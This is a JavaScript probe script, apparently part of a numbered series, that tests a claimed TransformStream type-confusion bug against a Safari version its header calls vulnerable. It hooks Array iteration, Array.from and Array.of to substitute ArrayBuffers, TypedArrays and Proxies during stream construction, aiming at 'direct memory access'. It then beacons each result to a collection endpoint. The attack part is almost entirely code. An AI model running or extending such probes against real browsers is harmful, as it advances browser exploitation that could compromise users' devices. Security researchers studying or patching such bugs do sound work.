// p118 — TransformStream type confusion (CVE-2026-43705 pattern)
// Tests if TransformStream exists and whether Symbol.iterator override
// causes type confusion in the constructor's internal array iteration.
// Fixed in Safari 26.5.2 (2026) — our Safari 17.2.x should be vulnerable.
(function(){
  var rid = 'v118t' + Math.random().toString(36).slice(2,15);
  function beacon(tag, data) {
    var body = typeof data === 'object' ? JSON.stringify(data) : String(data);
    try { navigator.sendBeacon('/beacon/V118T-' + tag, JSON.stringify({r:rid,b:body})); } catch(e){}
    try { fetch('/beacon/V118T-' + tag, {method:'POST',body:JSON.stringify({r:rid,b:body}),keepalive:true}).catch(function(){}); } catch(e2){}
  }
  beacon('L', 'probe118-start');

  var results = {};

  // T0: Check if TransformStream exists at all
  try {
    results.tsExists = typeof TransformStream !== 'undefined';
    results.tsType = typeof TransformStream;
    if (typeof TransformStream !== 'undefined') {
      var ts = new TransformStream();
      results.tsCreated = true;
      results.hasReadable = 'readable' in ts;
      results.hasWritable = 'writable' in ts;
      results.readableType = ts.readable ? ts.readable.constructor.name : 'null';
      results.writableType = ts.writable ? ts.writable.constructor.name : 'null';
    } else {
      results.tsCreated = false;
    }
  } catch(e) {
    results.tsExists = false;
    results.tsErr = e.constructor.name + ':' + e.message.slice(0,100);
  }
  beacon('T0-EXISTS', results);

  if (!results.tsExists || !results.tsCreated) {
    beacon('Z', 'probe118-done-no-ts');
    return;
  }

  // T1: Basic Symbol.iterator override — substitute plain objects
  var t1 = {};
  var origIter = Array.prototype[Symbol.iterator];
  try {
    Array.prototype[Symbol.iterator] = function() {
      var arr = this;
      var i = 0;
      return {
        next: function() {
          if (i >= arr.length) return {done:true};
          var val = arr[i];
          if (arr.length === 3 && i >= 1) val = {fake:true};
          i++;
          return {value:val, done:false};
        }
      };
    };
    var ts1 = new TransformStream();
    t1.threw = false;
    t1.result = 'created';
    t1.hasReadable = 'readable' in ts1;
    t1.readableType = ts1.readable ? ts1.readable.constructor.name : 'null';
  } catch(e) {
    t1.threw = true;
    t1.err = e.constructor.name + ':' + e.message.slice(0,120);
  } finally {
    Array.prototype[Symbol.iterator] = origIter;
  }
  beacon('T1-PLAINOBJ', t1);

  // T2: Substitute object with ArrayBuffer pointer
  var t2 = {};
  var buf = new ArrayBuffer(65536);
  try {
    Array.prototype[Symbol.iterator] = function() {
      var arr = this;
      var i = 0;
      return {
        next: function() {
          if (i >= arr.length) return {done:true};
          var val = arr[i];
          if (arr.length === 3 && i >= 1) val = {pad:0, ptr:buf};
          i++;
          return {value:val, done:false};
        }
      };
    };
    var ts2 = new TransformStream();
    t2.threw = false;
    t2.result = 'created';
    t2.bufDetached = buf.byteLength === 0;
    t2.hasReadable = 'readable' in ts2;
  } catch(e) {
    t2.threw = true;
    t2.err = e.constructor.name + ':' + e.message.slice(0,120);
  } finally {
    Array.prototype[Symbol.iterator] = origIter;
  }
  beacon('T2-PTROBJ', t2);

  // T3: Truncated iterator (0 entries instead of 3)
  var t3 = {};
  try {
    Array.prototype[Symbol.iterator] = function() {
      return {next: function(){return {done:true};}};
    };
    var ts3 = new TransformStream();
    t3.threw = false;
    t3.result = 'created';
  } catch(e) {
    t3.threw = true;
    t3.err = e.constructor.name + ':' + e.message.slice(0,120);
  } finally {
    Array.prototype[Symbol.iterator] = origIter;
  }
  beacon('T3-TRUNCATED', t3);

  // T4: Return TypedArray views as substitutes (would give direct memory access if confused)
  var t4 = {};
  try {
    var viewBuf = new ArrayBuffer(256);
    var u8 = new Uint8Array(viewBuf);
    var f64 = new Float64Array(viewBuf);
    Array.prototype[Symbol.iterator] = function() {
      var arr = this;
      var i = 0;
      return {
        next: function() {
          if (i >= arr.length) return {done:true};
          var val = arr[i];
          if (arr.length === 3 && i === 1) val = u8;
          if (arr.length === 3 && i === 2) val = f64;
          i++;
          return {value:val, done:false};
        }
      };
    };
    var ts4 = new TransformStream();
    t4.threw = false;
    t4.result = 'created';
    t4.hasReadable = 'readable' in ts4;
  } catch(e) {
    t4.threw = true;
    t4.err = e.constructor.name + ':' + e.message.slice(0,120);
  } finally {
    Array.prototype[Symbol.iterator] = origIter;
  }
  beacon('T4-TYPEDARRAY', t4);

  // T5: Substitute with Proxy objects to trap all property accesses
  var t5 = {};
  var proxyTraps = [];
  try {
    var proxyHandler = {
      get: function(target, prop) {
        proxyTraps.push('get:' + String(prop));
        return target[prop];
      },
      set: function(target, prop, val) {
        proxyTraps.push('set:' + String(prop));
        target[prop] = val;
        return true;
      },
      has: function(target, prop) {
        proxyTraps.push('has:' + String(prop));
        return prop in target;
      }
    };
    Array.prototype[Symbol.iterator] = function() {
      var arr = this;
      var i = 0;
      return {
        next: function() {
          if (i >= arr.length) return {done:true};
          var val = arr[i];
          if (arr.length === 3 && i >= 1) val = new Proxy({}, proxyHandler);
          i++;
          return {value:val, done:false};
        }
      };
    };
    var ts5 = new TransformStream();
    t5.threw = false;
    t5.trapCount = proxyTraps.length;
    t5.traps = proxyTraps.slice(0,30).join('|');
  } catch(e) {
    t5.threw = true;
    t5.err = e.constructor.name + ':' + e.message.slice(0,120);
    t5.trapCount = proxyTraps.length;
    t5.traps = proxyTraps.slice(0,30).join('|');
  } finally {
    Array.prototype[Symbol.iterator] = origIter;
  }
  beacon('T5-PROXY', t5);

  // T6: ReadableStream/WritableStream also use internal arrays — test those too
  var t6 = {};
  try {
    Array.prototype[Symbol.iterator] = function() {
      var arr = this;
      var i = 0;
      return {
        next: function() {
          if (i >= arr.length) return {done:true};
          var val = arr[i];
          if (arr.length >= 2 && i >= 1) val = {confused:true, idx:i};
          i++;
          return {value:val, done:false};
        }
      };
    };
    var rs = new ReadableStream({start:function(c){c.close();}});
    t6.readableOK = true;
    var ws = new WritableStream({write:function(){}});
    t6.writableOK = true;
  } catch(e) {
    t6.err = e.constructor.name + ':' + e.message.slice(0,120);
  } finally {
    Array.prototype[Symbol.iterator] = origIter;
  }
  beacon('T6-STREAMS', t6);

  // T7: Override Symbol.iterator on specific TransformStream-internal arrays
  // by hooking Array.from and Array.of
  var t7 = {};
  var origFrom = Array.from;
  var origOf = Array.of;
  var fromCalls = 0;
  var ofCalls = 0;
  try {
    Array.from = function() {
      fromCalls++;
      var result = origFrom.apply(this, arguments);
      if (result.length === 3) {
        result[1] = {hijacked:'from', idx:1};
        result[2] = {hijacked:'from', idx:2};
      }
      return result;
    };
    Array.of = function() {
      ofCalls++;
      var result = origOf.apply(this, arguments);
      if (result.length === 3) {
        result[1] = {hijacked:'of', idx:1};
        result[2] = {hijacked:'of', idx:2};
      }
      return result;
    };
    var ts7 = new TransformStream();
    t7.threw = false;
    t7.fromCalls = fromCalls;
    t7.ofCalls = ofCalls;
  } catch(e) {
    t7.threw = true;
    t7.err = e.constructor.name + ':' + e.message.slice(0,120);
    t7.fromCalls = fromCalls;
    t7.ofCalls = ofCalls;
  } finally {
    Array.from = origFrom;
    Array.of = origOf;
  }
  beacon('T7-ARRAYFROM', t7);

  // T8: Deep iteration hook — count exactly how many arrays of length 3
  // are iterated during TransformStream construction
  var t8 = {};
  var iterLog = [];
  try {
    Array.prototype[Symbol.iterator] = function() {
      var arr = this;
      var len = arr.length;
      iterLog.push('iter:len=' + len);
      var i = 0;
      return {
        next: function() {
          if (i >= arr.length) return {done:true};
          var val = arr[i];
          iterLog.push('read[' + i + ']:' + (typeof val));
          i++;
          return {value:val, done:false};
        }
      };
    };
    var ts8 = new TransformStream();
    t8.threw = false;
    t8.logLen = iterLog.length;
    t8.log = iterLog.slice(0,40).join('|');
  } catch(e) {
    t8.threw = true;
    t8.err = e.constructor.name + ':' + e.message.slice(0,120);
    t8.logLen = iterLog.length;
    t8.log = iterLog.slice(0,40).join('|');
  } finally {
    Array.prototype[Symbol.iterator] = origIter;
  }
  beacon('T8-ITERLOG', t8);

  // T9: Check if the bug manifests as a crash or incorrect behavior
  // by reading back the readable/writable after type-confused construction
  var t9 = {};
  try {
    Array.prototype[Symbol.iterator] = function() {
      var arr = this;
      var i = 0;
      return {
        next: function() {
          if (i >= arr.length) return {done:true};
          var val = arr[i];
          if (arr.length === 3 && i === 1) val = new ArrayBuffer(4096);
          if (arr.length === 3 && i === 2) val = new DataView(new ArrayBuffer(256));
          i++;
          return {value:val, done:false};
        }
      };
    };
    var ts9 = new TransformStream();
    t9.created = true;
    try {
      t9.readableType = typeof ts9.readable;
      t9.readableCtor = ts9.readable ? ts9.readable.constructor.name : 'null';
      t9.writableType = typeof ts9.writable;
      t9.writableCtor = ts9.writable ? ts9.writable.constructor.name : 'null';
    } catch(e2) {
      t9.accessErr = e2.constructor.name + ':' + e2.message.slice(0,100);
    }
  } catch(e) {
    t9.threw = true;
    t9.err = e.constructor.name + ':' + e.message.slice(0,120);
  } finally {
    Array.prototype[Symbol.iterator] = origIter;
  }
  beacon('T9-READBACK', t9);

  // T10: Timing attack — compare construction time with/without hook
  var t10 = {};
  try {
    var t0 = performance.now();
    for (var j = 0; j < 1000; j++) new TransformStream();
    var normalTime = performance.now() - t0;

    Array.prototype[Symbol.iterator] = function() {
      var arr = this;
      var i = 0;
      return {
        next: function() {
          if (i >= arr.length) return {done:true};
          var val = arr[i];
          if (arr.length === 3 && i >= 1) val = {fake:true};
          i++;
          return {value:val, done:false};
        }
      };
    };
    var t1start = performance.now();
    for (var k = 0; k < 1000; k++) new TransformStream();
    var hookedTime = performance.now() - t1start;

    t10.normalMs = Math.round(normalTime);
    t10.hookedMs = Math.round(hookedTime);
    t10.ratio = (hookedTime / normalTime).toFixed(2);
  } catch(e) {
    t10.err = e.constructor.name + ':' + e.message.slice(0,100);
  } finally {
    Array.prototype[Symbol.iterator] = origIter;
  }
  beacon('T10-TIMING', t10);

  beacon('Z', 'probe118-done');
})();
